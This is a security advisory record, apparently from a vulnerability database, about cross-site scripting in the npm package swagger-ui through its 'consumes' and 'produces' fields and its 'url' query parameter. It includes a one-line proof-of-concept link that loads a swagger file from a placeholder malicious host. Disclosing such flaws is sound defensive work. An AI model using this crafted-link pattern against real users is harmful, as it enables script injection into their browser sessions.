package_slug: "npm/swagger-ui"
title: "Cross-Site Scripting in swagger-ui"
description: "Affected versions of `swagger-ui` are vulnerable to cross-site scripting
  in both the `consumes` and `produces` parameters of the swagger JSON document for
  a given API.\n\nAdditionally, `swagger-ui` allows users to load arbitrary swagger
  JSON documents via the query string parameter `url`, allowing an attacker to exploit
  this attack against any user that the attacker can convince to visit a crafted link.\n\n##
  Proof of Concept\n\n```\nhttp://<USER_HOSTNAME>/swagger-ui/index.html?url=http://<MALICIOUS_HOSTNAME>/malicious-swagger-file.json\n````\n\n\n\n##
  Recommendation\n\nUpdate to version 2.2.1 or later."
